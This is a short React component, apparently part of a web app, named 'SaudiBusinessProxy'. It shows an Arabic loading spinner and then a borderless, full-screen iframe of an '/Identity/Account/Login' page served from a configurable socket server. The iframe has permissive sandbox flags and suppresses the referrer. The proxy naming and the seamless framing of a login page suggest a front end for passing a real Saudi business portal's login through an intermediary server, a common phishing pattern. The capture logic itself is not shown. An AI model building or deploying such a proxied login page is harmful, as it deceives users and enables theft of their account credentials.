import { useEffect, useState } from "react";

const SERVER_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";

export default function SaudiBusinessProxy() {
  const [loaded, setLoaded] = useState(false);

  useEffect(() => {
    // Full screen - no scrollbars on parent
    const s = document.documentElement.style;
    const b = document.body.style;
    s.overflow = "hidden"; s.margin = "0"; s.padding = "0"; s.height = "100%";
    b.overflow = "hidden"; b.margin = "0"; b.padding = "0"; b.height = "100%";
    return () => {
      s.overflow = ""; s.margin = ""; s.padding = ""; s.height = "";
      b.overflow = ""; b.margin = ""; b.padding = ""; b.height = "";
    };
  }, []);

  return (
    <>
      {/* Preconnect to server for faster loading */}
      <link rel="preconnect" href={SERVER_URL} />
      <link rel="dns-prefetch" href={SERVER_URL} />
      
      {/* Loading overlay - disappears when iframe loads */}
      {!loaded && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 9999,
          display: "flex", alignItems: "center", justifyContent: "center",
          background: "#fff",
        }}>
          <div style={{ textAlign: "center", direction: "rtl", fontFamily: "Tajawal, sans-serif" }}>
            <div style={{
              width: 40, height: 40,
              border: "3px solid #e5e7eb", borderTop: "3px solid #059669",
              borderRadius: "50%", animation: "sp .7s linear infinite",
              margin: "0 auto 12px",
            }} />
            <p style={{ color: "#9ca3af", fontSize: 14, margin: 0 }}>جاري التحميل...</p>
            <style>{`@keyframes sp{to{transform:rotate(360deg)}}`}</style>
          </div>
        </div>
      )}

      {/* Full-screen iframe - loads immediately */}
      <iframe
        src={`${SERVER_URL}/Identity/Account/Login`}
        onLoad={() => setLoaded(true)}
        style={{
          position: "fixed", inset: 0,
          width: "100%", height: "100%",
          border: "none", margin: 0, padding: 0,
        }}
        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-top-navigation allow-top-navigation-by-user-activation allow-modals"
        referrerPolicy="no-referrer"
      />
    </>
  );
}
